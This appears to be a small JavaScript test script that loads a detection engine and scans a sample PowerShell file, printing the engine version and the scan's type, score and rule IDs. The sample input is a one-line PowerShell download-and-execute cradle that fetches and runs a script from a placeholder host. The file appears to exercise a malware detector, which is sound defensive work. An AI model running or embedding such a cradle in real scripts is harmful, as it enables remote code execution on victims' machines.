import { loadEngine, scan, ids } from './engine.mjs';
const E = loadEngine();
console.log('engine', E.version, Object.keys(E).length, 'exports');
const r = await scan(E, 'hello.ps1', new TextEncoder().encode('Invoke-Expression (New-Object Net.WebClient).DownloadString("http://x.example/a.ps1")'));
console.log(r.type, r.score, ids(r));
